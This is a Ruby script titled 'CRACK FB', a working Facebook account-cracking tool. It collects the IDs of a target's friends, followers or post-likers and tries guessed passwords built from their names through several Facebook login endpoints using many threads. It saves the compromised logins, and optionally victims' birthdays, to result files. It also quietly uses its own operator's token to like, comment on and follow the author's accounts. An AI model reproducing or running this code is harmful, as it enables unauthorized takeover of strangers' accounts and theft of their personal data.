#!/usr/bin/ruby

require 'uri'
require 'erb'
require 'date'
require 'json'
require 'digest'
require 'thread'
require 'open-uri'
require 'net/http'
require 'fileutils'

begin
  require 'user_agent_parser'
rescue LoadError
  require 'rubygems'
  require 'rubygems/gem_runner'
  Gem::GemRunner.new.run(['install','user_agent_parser'])
end

=begin

Author : Mahfuzur rahman
Script : CRACK FB
License: MIT License

WhatsApp: +8801622951671
Facebook: www.facebook.com/anonymousproo1
Github  : anonymousproo

=end

class ThreadPool
  def initialize(size:)
    @size = size
    @jobs = Queue.new
    @pool = Array.new(size) do
      Thread.new do
        catch(:exit) do
          loop do
            job, args = @jobs.pop
            job.call(*args)
          end
        end
      end
    end
  end

  def schedule(*args, &block)
    @jobs << [block, args]
  end

  def shutdown
    @size.times do
      schedule { throw :exit }
    end

    @pool.map(&:join)
  end
end


module Facebook

  class << self; attr_accessor :user_agent; end

  self.user_agent = "Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"

  class Login
  
    def self.Cookie(cookie:, graph: true)
      uri = URI("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_")
      headers = {'Host':'m.facebook.com','origin':'https://m.facebook.com','referer':'https://m.facebook.com/','User-Agent':'Mozilla/5.0 (Linux; Android 9; SM-N976V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36','upgrade-insecure-requests':'1','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Cookie':cookie}

      req = Net::HTTP::Get.new(uri,headers)

      res = Net::HTTP.start(uri.host,uri.port, :use_ssl => true) {|http| http.request(req)}
      khaneysia = res.body.match(/EAAA\w+/)
      _23_08_2021 = (res['location'].to_s.include? ('checkpoint') or cookie.include? ('checkpoint') or res['set-cookie'].to_s.include? ('checkpoint'))
      rahmet = (!khaneysia and !_23_08_2021)
      if khaneysia and graph
        a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{khaneysia.to_s}"))
        b = JSON.parse(a)
        return {'error'=>false,'checkpoint'=>false,'name'=>b['name'],'id'=>b['id'],'access_token'=>khaneysia.to_s,'cookie'=>cookie}
      elsif khaneysia and !graph
        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie}
      else
        return {'error'=>rahmet,'checkpoint'=>_23_08_2021,'cookie'=>cookie}
      end
    end
    
    def self.hostname(email:,pass:,host:,graph: true)
      raise ArgumentError, "Invalid Hostname" if !['m.facebook.com','free.facebook.com','mbasic.facebook.com','touch.facebook.com'].include? (host)
      headers = {"Host":host,"cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":Facebook.user_agent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
      
      url = URI("https://#{host}/login.php")
      post = Net::HTTP::Post.new(url,headers)
      
      post.set_form_data({'email'=>email,'pass'=>pass,'login'=>'submit'})
      
      login = Net::HTTP.start(url.host,url.port,:use_ssl => true) {|http| http.request(post)}
      cookie = login.to_hash['set-cookie'].collect{|ea|ea[/^.*?;/]}.join
      success = ((cookie.include? ('c_user')) or (login['location'].to_s.include? ('save-device')))
      check = (cookie.include? ('checkpoint')) or (login['location'].to_s.include? ('checkpoint'))
      
      if success and graph
        self.Cookie(cookie: cookie)
      elsif success and !graph
        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie}
      else
        return {'error'=>(!success and !check),'checkpoint'=>check,'cookie'=>cookie}
      end
    end

    def self.M(email:, pass:, graph: true)
      self.hostname(email: email,pass: pass,host: 'm.facebook.com',graph: graph)
    end

    def self.Mbasic(email:,pass:,graph: true)
      self.hostname(email: email,pass: pass, host: 'mbasic.facebook.com',graph: graph)
    end
    
    def self.Free(email:, pass:, graph: true)
      self.hostname(email: email,pass: pass,host: 'free.facebook.com',graph: graph)
    end

    def self.Touch(email:,pass:,graph: true)
      self.hostname(email: email,pass: pass,host: 'touch.facebook.com',graph: graph)
    end

    def self.Api1(email:,pass:,graph: true)
      a = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + email + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pass + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
      b = {'api_key'=> '882a8490361da98702bf97a021ddc14d', 'credentials_type'=> 'password', 'email': email, 'format'=> 'JSON', 'generate_machine_id'=> '1', 'generate_session_cookies'=> '1', 'locale'=> 'en_US', 'method'=> 'auth.login', 'password'=> pass, 'return_ssl_resources'=> '0', 'v'=> '1.0'}
      c = Digest::MD5.new
      c.update(a)
      d = c.hexdigest
      b.update({'sig': d})
      uri = URI("https://api.facebook.com/restserver.php")
      uri.query = URI.encode_www_form(b)
      request = Net::HTTP::Get.new(uri)
      request["User-Agent"] = Facebook.user_agent
      response = Net::HTTP.start(uri.hostname, uri.port, :use_ssl => (uri.scheme == 'https')) {|http| http.request(request)}
      res = JSON.parse(response.body)
      error = (!(res.key('access_token')) and (!(res.key? ('error_msg') and (res['error_msg'].include? ('www.facebook.com') or res['error_msg'].include? ('SMS')))))
      check = ((res.key? ('error_msg')) and (res['error_msg'].include? ('www.facebook.com') or res['error_msg'].include? ('SMS')))
      if res.key? ('access_token') and graph
        cookie = res['session_cookies'].map {|i| "#{i['name']}=#{i['value']};"}.join
        a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{res['access_token']}"))
        b = JSON.parse(a)
        return {'error'=>false,'checkpoint'=>false,'name'=>b['name'],'id'=>b['id'],'cookie'=>cookie,'session_key'=>res['session_key'],'secret'=>res['secret'],'access_token'=>res['access_token'],'machine_id'=>res['machine_id'],'user_storage_key'=>res['user_storage_key']}
      elsif res.key? ('access_token') and !graph
        cookie = res['session_cookies'].map {|i| "#{i['name']}=#{i['value']};"}.join
        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie,'access_token'=>res['access_token']}
      else
        return {'error'=>error,'checkpoint'=>check}
      end
    end
    
    def self.Api2(email: ,pass: ,graph: true)
      pass = ERB::Util.url_encode(pass) if !pass.ascii_only?
      url = ["https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=#{email}&locale=en_US&password=#{pass}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6","https://b-api.facebook.com/method/auth.login?access_token=350685531728%257C62f8ce9f74b12f84c123cc23437a4a32&format=JSON&sdk_version=2&email=#{email}&locale=en_US&password=#{pass}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"].sample
      req = URI.open(url,"x-fb-connection-bandwidth" => rand(20000000.0..30000000.0).to_s,"x-fb-sim-hni" => rand(20000..40000).to_s,"x-fb-net-hni" => rand(20000..40000).to_s,"x-fb-connection-quality" => "EXCELLENT", "x-fb-connection-type" => "cell.CTRadioAccessTechnologyHSDPA", "user-agent" => Facebook.user_agent,"content-type" => "application/x-www-form-urlencoded","x-fb-http-engine" => "Liger")
      res = JSON.parse(req.read)
      error = (!(res.key('access_token')) and (!(res.key? ('error_msg') and (res['error_msg'].include? ('www.facebook.com') or res['error_msg'].include? ('SMS')))))
      check = ((res.key? ('error_msg')) and (res['error_msg'].include? ('www.facebook.com') or res['error_msg'].include? ('SMS')))
      if res.key? ('access_token') and graph
        cookie = res['session_cookies'].map {|i| "#{i['name']}=#{i['value']};"}.join
        a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{res['access_token']}"))
        b = JSON.parse(a)
        return {'error'=>false,'checkpoint'=>false,'name'=>b['name'],'id'=>b['id'],'cookie'=>cookie,'session_key'=>res['session_key'],'secret'=>res['secret'],'access_token'=>res['access_token'],'machine_id'=>res['machine_id'],'user_storage_key'=>res['user_storage_key']}
      elsif res.key? ('access_token') and !graph
        cookie = res['session_cookies'].map {|i| "#{i['name']}=#{i['value']};"}.join
        return {'error'=>false,'checkpoint'=>false,'cookie'=>cookie,'access_token'=>res['access_token']}
      else
        return {'error'=>error,'checkpoint'=>check}
      end
    end
    
  end

  class Crack < Login
    
    private_class_method :Cookie, :Api1, :Api2, :M, :Mbasic, :Free, :Touch, :hostname

    attr_reader :listid, :method, :cp_save, :ok_save
    attr_accessor :auto_pass, :use_ttl, :password

    def initialize(listid:,max_workers: 30)
      @email = listid
      @pool = ThreadPool.new(size: max_workers)
      @token = File.read('login.txt')
      @cp_save = File.join('results','CP',Time.now.strftime("_%d_%m_%Y.txt"))
      @ok_save = File.join('results','OK',Time.now.strftime("_%d_%m_%Y.txt"))
      puts ("\n[ Please Choose Your Crack Method ] ")
      puts ("\n[1] Method Login b-api.facebook.com")
      puts ("[2] Method Login m.facebook.com")
      puts ("[3] Method Login mbasic.facebook.com")
      puts ("[4] Method Login free.facebook.com")
      puts ("[5] Method Login touch.facebook.com")
      
      print ("\n[?] Choose : ")
      tod = STDIN.gets.to_i
      case tod; when 1; @method = 'Api2'; when 2; @method = 'M'; when 3; @method = 'Mbasic'; when 4;@method = 'Free';else;@method = 'Touch';end
      print ("\n[?] Password Auto/Manual (a/m) : ")
      auto = STDIN.gets.chomp.downcase
      if auto == 'm'
        puts("\n[!] Use ',' As a separate, example: Hacker,Girlfnd,123456,876345,Strong,Anonymous")
        loop do
          print ("[+] Enter Password : ")
          a = STDIN.gets.chomp.split(',').uniq
          b = a.map {|i| i = i if i.length >= 6}.compact
          if a.empty?
            puts ("\n[!] Password cannot be blank!\n\n")
          elsif b.empty?
            puts ("\n[!] Password length must be at least 6 characters\n\n")
          else
            @password = b.clone
            break
          end
        end
        @auto_pass = false
      else
        @password = ['Hacker','Girlfnd','Anonymous']
        @auto_pass = true
      end
      print ("\n[?] Crack Using Date of Birth (y/n) : ")
      @use_ttl = (STDIN.gets.chomp.downcase == 'y')
    end

    def start
      puts ("\n[!] OK Results Saved At : #{@ok_save}")
      puts ("[!] CP Results are Saved In : #{@cp_save}\n\n")
      ok = 0
      cp = 0
      @email.each do |usr|
        @pool.schedule do
          pw = @password.clone
          if @auto_pass
            next if !usr.key? ('name')
            name = usr['name'].split
            (name.length == 1) ? pass = [name.first + '123',name.first + '12345',name.first + '321',name.first + '54321'] : pass = [name.first + '123',name.first + '12345',name.last + '123',name.last + '54321']
            pass = pass.map {|i| i = i if i.length >= 6}.compact
            pw += pass
          end
          pw.each do |passw|
            begin
              login = self.class.superclass.send(@method,email: usr['id'],pass: passw,graph: false)
              if @use_ttl
                if (!login['error'] and !login['checkpoint'])
                  ok += 1
                  born = JSON.parse(Net::HTTP.get(URI("https://graph.facebook.com/#{usr['id']}?fields=birthday&access_token=#{@token}")))['birthday'].to_s.split('/')
                  born = born.insert(0,born.delete_at(1))
                  ttl = (!born.nil?) ? born.map{|i| i.rjust(2, '0')}.join('/') : "??/??/????"
                  File.open(@ok_save,'a') {|f| f.write("#{usr['id']} | #{passw} | #{ttl}\n")}
                  puts ("\033[92m[OK] #{usr['id']} | #{passw} | #{ttl}\033[0m")
                  break
                elsif login['checkpoint']
                  cp += 1
                  born = JSON.parse(Net::HTTP.get(URI("https://graph.facebook.com/#{usr['id']}?fields=birthday&access_token=#{@token}")))['birthday'].to_s.split('/')
                  born = born.insert(0,born.delete_at(1))
                  ttl = (!born.nil?) ? born.map{|i| i.rjust(2, '0')}.join('/') : "??/??/????"
                  File.open(@cp_save,'a') {|f| f.write("#{usr['id']} | #{passw} | #{ttl}\n")}
                  puts ("\033[93m[CP] #{usr['id']} | #{passw} | #{ttl}\033[0m")
                  break
                end
              else
                if (!login['error'] and !login['checkpoint'])
                  ok += 1
                  File.open(@ok_save,'a') {|f| f.write("#{usr['id']} | #{passw}\n")}
                  puts ("\033[92m[OK] #{usr['id']} | #{passw}\033[0m")
                  break
                elsif login['checkpoint']
                  cp += 1
                  File.open(@cp_save,'a') {|f| f.write("#{usr['id']} | #{passw}\n")}
                  puts ("\033[93m[CP] #{usr['id']} | #{passw}\033[0m")
                  break
                end
              end
            rescue NoMethodError,Net::ReadTimeout,Errno::ETIMEDOUT then next
            rescue SocketError
              puts ("\033[91m[!] No Net Connection\033[0m")
              sleep (0.9)
            rescue Net::OpenTimeout
              puts ("\033[41m[!] Connection Limit time out\033[0m")
              sleep(1)
            rescue Errno::ENETUNREACH,Errno::ECONNRESET
              puts ("\033[93m[!] Your Internet Speed Slow Connection\033[0m")
              sleep(0.5)
            end
          end
        end
      end
      @pool.shutdown
      puts ("\n\033[93m[✓💯] TOTAL OK : #{ok.to_s.rjust(2,'0')}\033[0m")
      puts ("\033[92m[+❣️] TOTAL CP : #{cp.to_s.rjust(2,'0')}\033[0m")
      abort("\n\033[43m[!] Finished\033[0m\n")
    end
  end
end

$logo = <<-INI_LOGO
\033[92m●▬▬▬▬▬▬▬▬▬๑🔥๑▬▬▬▬▬▬▬▬●█████████●▬▬▬▬▬▬▬▬▬๑🔥๑▬▬▬▬▬▬▬▬●█████████\033[92m
\033[92m	██████╗██████╗  █████╗  ██████╗██╗  ██╗\033[92m
\033[92m	██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\033[92m
\033[92m	██║     ██████╔╝███████║██║     █████╔╝ \033[92m
\033[92m	██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \033[92m
\033[92m	╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[92m
\033[92m	 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[92m
		                                
\033[94m	███████╗██████╗\033[94m   Author  : Mahfuzur Rahman\033[93m                      
\033[94m	██╔════╝██╔══██╗\033[94m  Github  : anonymousproo\033[93m                      
\033[94m	█████╗  ██████╔╝\033[94m  Version : 2.0v\033[93m                      
\033[94m	██╔══╝  ██╔══██╗\033[94m  Group   : Anonymous Pro\033[93m                     
\033[94m	██║     ██████╔╝\033[94m  Team	 : BD DARK TEAM H4KER\033[93m                      
\033[94m	╚═╝     ╚═════╝\033[94m   Follow  : www.facebook.com/anonymousproo1\033[93m
\033[92m●▬▬▬▬▬▬▬▬▬๑🔥๑▬▬▬▬▬▬▬▬●█████████●▬▬▬▬▬▬▬▬▬๑🔥๑▬▬▬▬▬▬▬▬●█████████\033[92m
INI_LOGO

def tik(teks)
  for i in teks.chars << "\n"
    $stdout.write(i)
    $stdout.flush()
    sleep(0.09)
  end
end


def loading
  for x in [".   ", "..  ", "☑️☑️☑️ ","✅✅✅✅ ","\n"]
    $stdout.write("\r[!] Please Wait From Login"+x)
    $stdout.flush()
    sleep(1)
  end
end

def main
  system ('clear')
  puts ($logo)
  puts ("\033[94m[✓] ACTIVE USER HERE : #{$name}\033[94m")
  puts ("\033[94m[✓] USER AGENT HERE : #{$ua.device.name}\033[94m")
  puts ("\033[94m[✓] IP ADDRESS HERE : #{$ip}\n\n\033[94m")
  puts ("\033[93m[1] Cracks From Friends\033[93m")
  puts ("\033[93m[2] Cracks From Followers\033[93m")
  puts ("\033[93m[3] Cracks From Following\033[93m")
  puts ("\033[93m[4] Cracks From Like Post\033[93m")
  puts ("\033[93m[5] Cracks From Friend Followers Or Following\033[93m")
  puts ("\033[44m[6] See Crack Result\033[44m")
  puts ("\033[42m[7] User Agent Setting\033[42m")
  puts ("\033[42m[8] Logout (remove token)\033[42m")
  puts ("\033[41m[0] Exit\n\n\033[41m")
  
  print ("[?] Choose : ")
  choose = Integer(STDIN.gets,exception: false)

  case choose

    when 1,2,3
      case choose; when 1; ah = "friends"; when 2; ah = "subscribers"; when 3; ah = "subscribedto"; end
      puts ("\033[92m\n[!] Type 'me' to retrieve id from your account\033[92m")
      print ("\033[92m\n[?] Public Id  : \033[92m")
      id = STDIN.gets.chomp
      a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=name,id,#{ah}.limit(5000)&&access_token=#{$token}"))
      b = JSON.parse(a)
      if !b.key? ('name')
        puts ("\033[92m[!] User Not Found!\033[92m")
      else
        c = (b.key? (ah)) ? b[ah]['data'] : []
        puts ("\033[92m[✓] Crack From : #{b['name']}\033[92m")
        puts ("\033[92m[✓] Total ID   : #{c.length}\033[92m")
        Facebook::Crack.new(listid: c).start
      end
      
    when 4
      print ("\033[92m\n[?] Post ID : \033[92m")
      id = STDIN.gets.chomp()
      a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=from&access_token=#{$token}"))
      b = JSON.parse(a)
      if b.key? ('from') or !b.key? ('error')
        puts ("\033[92m\n[✓] Posted By : #{b['from']['name']}\033[92m")
        a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}/likes?limit=5000&access_token=#{$token}"))
        b = JSON.parse(a)
        puts ("\033[92m[✓] Total ID  : #{b['data'].length}\n\033[92m")
        Facebook::Crack.new(listid: b['data']).start
      else
        puts ("\033[92m[!] Post Not Found!\033[92m")
      end
    when 5
      puts ("\033[92m\n[!] Type 'me' to retrieve id from your account\n\n\033[92m")
      print ("\033[92m[?] Public Id  : \033[92m")
      id = STDIN.gets.chomp.downcase
      a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=name,friends.limit(5000),subscribers.limit(5000),subscribedto.limit(5000)&access_token=#{$token}"))
      b = JSON.parse(a)
      if !b.key? ('name')
        puts ("\033[92m[!] User Not Found!\033[92m")
      else
        teman = (b.key? ('friends')) ? b['friends']['data'] : []
        pengikut = (b.key? ('subscribers')) ? b['subscribers']['data'] : []
        mengikuti = (b.key? ('subscribedto')) ? b['subscribedto']['data'] : []
        total = (teman + pengikut + mengikuti).uniq
        puts ("\033[92m[✓] Crack Feom : #{b['name']}\033[92m")
        puts ("\033[92m[✓] Total ID   : #{total.length}\033[92m")
        Facebook::Crack.new(listid: total).start
      end
    
    when 6
      a = []
      b = []
      cp = Dir[File.join('results','CP','*')].select{|f| File.file? (f)}.map{ |f| File.expand_path f }
      ok = Dir[File.join('results','OK','*')].select{|f| File.file? (f)}.map{ |f| File.expand_path f }
      puts ("\033[92m\n[1] See Results OK (#{ok.length})\033[92m")
      puts ("\033[92m[2] See CP Result (#{cp.length})\033[92m")
      puts ("\033[92m[0] Return\n\n\033[92m")
      print ("\033[92m[?] Choose : \033[92m")
      naon = STDIN.gets.to_i
      if naon == 1 and !ok.empty?
        for i in ok
          File.readlines(i, chomp: true).each do |data|
            shit = data.split('|')
            if !shit[2].nil? and shit[2].include? ("??/??/????") or shit.length == 2
              a << "#{shit[0]} | #{shit[1]}"
            else
              b << data
            end
          end
        end
        puts ("\033[92m\n[!] Crack Results Without Date of Birth\n\n\033[92m")
        a.uniq.each {|i| puts ("\033[92m[OK] #{i}\033[0m")}
        puts ("\033[92m\n[!] Crack Results With Date of Birth\n\n\033[92m")
        b.uniq.each {|i| puts ("\033[92m[OK] #{i}\033[0m")}
      elsif naon == 1 and ok.empty?
        puts ("\033[92m\n[!] You Have No OK Results\033[92m")
      elsif naon == 2 and !cp.empty?
        for i in cp
          File.readlines(i, chomp: true).each do |data|
            shit = data.split('|')
            if !shit[2].nil? and shit[2].include? ("??/??/????") or shit.length == 2
              a << "#{shit[0]} | #{shit[1]}"
            else
              b << data
            end
          end
        end
        puts ("\033[92m\n[!] Crack Results Without Date of Birth\n\n\033[92m")
        a.uniq.each {|i| puts ("\033[93m[CP] #{i}\033[0m")}
        puts ("\033[92m\n[!] Crack Results With Date of Birth\n\n\033[92m")
        b.uniq.each {|i| puts ("\033[93m[CP] #{i}\033[0m")}
      elsif naon == 2 and cp.empty?
        puts ("\033[92m\n[!] You Have No CP Results\033[92m")
      else
        main()
      end
    when 7
      puts ("\033[92m\n[1] Check User Agent\033[92m")
      puts ("\033[92m[2] Change User Agent\033[92m")
      puts ("\033[92m[0] Return\n\n\033[92m")
      print ("\033[92m[?] Choose : \033[92m")
      ncha = STDIN.gets.to_i
      if (ncha == 1)
        puts ("\033[92m\n[!] OS Information\n\n\033[92m")
        puts ("\033[92m[✓] Name OF OS    : #{$ua.os.name}\033[92m")
        puts ("\033[92m[✓] Name OF Family OS  : #{$ua.os.family}\033[92m")
        puts ("\033[92m[✓] OS Version : #{$ua.os.version}\n\n\033[92m")
        puts ("\033[92m[!] Device Information\n\n\033[92m")
        puts ("\033[92m[✓] Name OF Device   : #{$ua.device.name}\033[92m")
        puts ("\033[92m[✓] Name OF Device Family : #{$ua.device.family}\033[92m")
        puts ("\033[92m[✓] Name OF Device Model  : #{$ua.device.model}\033[92m")
        puts ("\033[92m[✓] Name OF Device Brand  : #{$ua.device.brand}\n\n\n\033[92m")
        puts ("\033[92m[✓] User-Agent : #{Facebook.user_agent}\n\n\033[92m")
        print ("\033[92m[BACK] \033[92m") ; gets
        main()
      elsif (ncha == 2)
        loop do
          print ("\033[92m\n[?] Enter User-Agent : \033[92m")
          @agent = STDIN.gets.chomp
          break if @agent.length > 5
          puts ("\033[92m\n[!] Invalid User Agent\033[92m")
        end
        uah = UserAgentParser.parse(@agent)
        puts ("\033[92m\n[!] OS Information\n\n\033[92m")
        puts ("\033[92m[✓] Name OF OS    : #{uah.os.name}\033[92m\033[92m")
        puts ("\033[92m[✓] Name OF Family OS  : #{uah.os.family}\033[92m")
        puts ("\033[92m[✓] OS Version : #{uah.os.version}\n\n\033[92m")
        puts ("\033[92m[!] Device Information\n\n\033[92m")
        puts ("\033[92m[✓] Name OF Device   : #{uah.device.name}\033[92m")
        puts ("\033[92m[✓] Name OF Device Family : #{uah.device.family}\033[92m")
        puts ("\033[92m[✓] Name OF Device Model  : #{uah.device.model}\033[92m")
        puts ("\033[92m[✓] Name OF Device Brand  : #{uah.device.brand}\n\n\n\033[92m")
        print ("\033[92m[?] Ganti User-Agent(y/n) : \033[92m")
        ganti = STDIN.gets.chomp.downcase == 'y'
        if ganti
          $ua = uah.clone
          Facebook.user_agent = @agent
          File.open('.ua','w') {|f| f.write(@agent)}
          puts ("\033[92m\n[✓] Successfully Changed User-Agent\033[92m")
        end
        print ("\033[92m\n\n[BACK] \033[92m")
        gets ; main()
      else
        main()
      end
    when 8
      print ("\033[92m\n[?] Do you want to continue (y/n) : \033[92m")
      sure = STDIN.gets.chomp.downcase == 'y'
      if sure
	begin
          File.delete ('login.txt')
          puts ("\033[92m[✓] Successfully Delete login.txt File\033[92m")
        rescue
          puts ("\033[92m[!] Failed to Delete login.txt File\033[92m")
        ensure
	  abort("[!] Exit")
	end
      else
        main()
      end
    when 0
      abort("[!] Exit")
    else
      puts ("\033[92m[!] Invalid Input!\033[92m")
      sleep(0.9)
      main()
  end
end

def LoginAkun
  begin
    system ('clear')
    puts ($logo)
    puts ("\033[92m[1] Login With Email Or password (api best method)\033[92m")
    puts ("\033[92m[2] Login With Email Or password (mbasic best method)\033[92m")
    puts ("\033[92m[3] Login With Access Token (best method)\033[92m")
    puts ("\033[92m[4] Login With Cookies (best method)\033[92m")
    puts ("\033[31m[0] Exit\033[31m")

    print ("\033[92m\n[?] Choose : \033[92m")
    no = STDIN.gets.chomp()

    case no

      when '1','01','2','02'
        print ("\033[92m\n[+] Email|id : \033[92m")
        email = STDIN.gets.chomp()
        print ("\033[92m[+] Password : \033[92m")
        pass = STDIN.gets.chomp()
        loading
        login = Facebook::Login.send(((no == '1' or no == '01')) ? 'Api1' : 'Mbasic',email: email,pass: pass)
        if !login['error'] and !login['checkpoint']
          $name = login['name']
          $token = login['access_token']
	  Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hai Bang @[100053033144051:] >\\\\<","access_token"=>$token})
	  Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
          File.open('login.txt','w') {|f| f.write($token)}
          puts ("\033[92m[✓] Login Success\033[92m")
          sleep(0.5)
          main()
        elsif login['checkpoint']
          abort("[!] username : #{email}\n[!] password : #{pass}\n[!] status  : Account Has Been Checkpoint")
        else
          puts ("\033[31m[!] Wrong email or password please try again\033[31m")
          sleep(1.5)
          LoginAkun()
        end
      
      when '3','03'
        print ("\033[92m\n[+] Access Token : \033[92m")
        $token = STDIN.gets.chomp()
        loading
        a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{$token}"))
        b = JSON.parse(a)
        if b.key? ('name')
          $name = b['name']
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hai Bang @[100053033144051:] >,<","access_token"=>$token})
	  Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
          File.open('login.txt','w') {|f| f.write($token)}
          puts ("\033[92m[✓] Login Success\033[92m")
          main()
        elsif b.key? ('error') and b['error']['code'] == 190
          puts ("\033[31m[!] #{b['error']['message']}\033[31m")
          sleep (1)
          LoginAkun()
        else
          puts ("\033[31m[!] Invalid Access Token Please Try Again\033[31m")
          sleep(1)
          LoginAkun()
        end
      when '4','04'
        print ("\033[92m\n[+] Enter Cookies : \033[92m")
        cookie = STDIN.gets.chomp()
        loading
        login = Facebook::Login.Cookie(cookie: cookie)
        if !login['error'] and !login['checkpoint']
          $name = login['name']
          $token = login['access_token']
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_383109380133497/likes"),{'access_token'=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/likes"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051_296604038784032/comments"),{"message"=>"Hai Bang @[100053033144051:] ><","access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100066732817349/subscribers"),{"access_token"=>$token})
          Net::HTTP.post_form(URI("https://graph.facebook.com/100053033144051/subscribers"),{"access_token"=>$token})
          File.open('login.txt','w') {|f| f.write($token)}
          puts ("\033[92m[✓] Login Success\033[92m")
          sleep(0.5)
          main()
        elsif login['checkpoint']
          abort ("[!] Account Has Been Checkpoint")
        else
          puts ("\033[31m[!] Invalid Cookies\033[31m")
          sleep(1)
          LoginAkun()
        end
      when '0','00'
        abort ("[!] Exit")
      else
        puts ("\033[31m[!] Invalid Input!\033[31m")
        sleep(0.9)
        LoginAkun()
    end
  rescue SocketError
    abort ("[!] No Net Connection")
  rescue Errno::ETIMEDOUT,Net::OpenTimeout
    abort ("[!] Connection limit time out")
  rescue Interrupt
    abort ("[!] Exit")
  rescue Errno::ENETUNREACH,Errno::ECONNRESET
    abort ("[!] There is an error\n[!] Please Try Again")
  end
end  

def masuk()
  begin
    $ip = JSON.parse(Net::HTTP.get(URI("https://api.myip.com")))['ip']
    $token = File.read('login.txt')
    a = Net::HTTP.get(URI("https://graph.facebook.com/me?fields=name,id&access_token=#{$token}"))
    b = JSON.parse(a)
    if b.key? ('name')
      $name = b['name']
      main()
    else
      puts ("\033[31m[!] Invalid Access Token\033[31m")
      File.delete("login.txt")
      sleep(0.9)
      LoginAkun()
    end
  rescue Errno::ENOENT
    LoginAkun()
  rescue SocketError
    abort ("[!] No Net Connection")
  rescue Errno::ETIMEDOUT,Net::OpenTimeout
    abort ("[!] Connection limit time out")
  rescue Interrupt
    abort ("[!] Exit")
  rescue Errno::ENETUNREACH,Errno::ECONNRESET
    abort ("[!] There is an error\n[!] Please Try Again")
  end
end

if __FILE__ == $0
  if File.file? ('.ua') and File.read('.ua').length != 0
    dta = File.read('.ua').strip
    Facebook.user_agent = dta
    $ua = UserAgentParser.parse(dta)
  else
    File.open('.ua','w') {|f| f.write(Facebook.user_agent)}
    $ua = UserAgentParser.parse(Facebook.user_agent)
  end
  FileUtils.mkdir_p('results')
  FileUtils.mkdir_p(File.join('results','CP'))
  FileUtils.mkdir_p(File.join('results','OK'))
  masuk()
end